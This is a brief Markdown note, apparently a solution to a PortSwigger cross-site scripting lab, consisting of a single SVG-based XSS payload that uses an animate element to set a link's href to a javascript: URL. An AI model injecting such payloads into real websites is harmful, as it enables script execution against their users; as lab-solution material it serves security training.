___
- tags: #xss #owasp #portswigger
___
## Solución
```html
<svg><a><animate attributeName=href values=javascript:alert(0) /><text x=30 y=30>Click me!</text></a>
```
